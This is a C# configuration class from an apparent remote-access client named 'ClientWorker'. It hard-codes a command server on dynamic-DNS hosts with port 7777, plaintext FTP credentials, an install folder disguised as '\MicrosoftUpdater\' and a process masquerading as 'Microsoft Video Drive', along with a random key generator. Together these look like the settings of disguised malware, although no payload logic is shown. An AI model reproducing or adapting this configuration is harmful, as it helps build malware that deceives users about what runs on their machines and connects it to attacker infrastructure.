using System;
using System.Collections.Generic;
using System.Text;

namespace ClientWorker
{
	public static class StartData
	{
		public static string currentServer = "fokes1.asuscomm.com";
        public static int port = 7777;
        public static string ftpUser = "ff";
		public static string ftpPass = "WorkerFF";
		public static int ftpPort = 21;
		public static string floaderNewCopy = "\\MicrosoftUpdater\\";
		public static string service = "Service.exe";
		public static string updater = "Updater.exe";
        public static string DescriptionProcess = "Service";

        public static string MProcDescription = "Microsoft Video Drive";

        public static List<string> ddnsHostName = new List<string>
		{
			"fokes1.asuscomm.com",
			"us30.dlinkddns.com"
		};

		public static List<string> listFiles = new List<string>
		{
			"Service.exe"
		};

        private static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        public static void GenerateKey()
        {
            Service.Properties.Settings.Default.Key = RandomString(32);
        }
    }
}
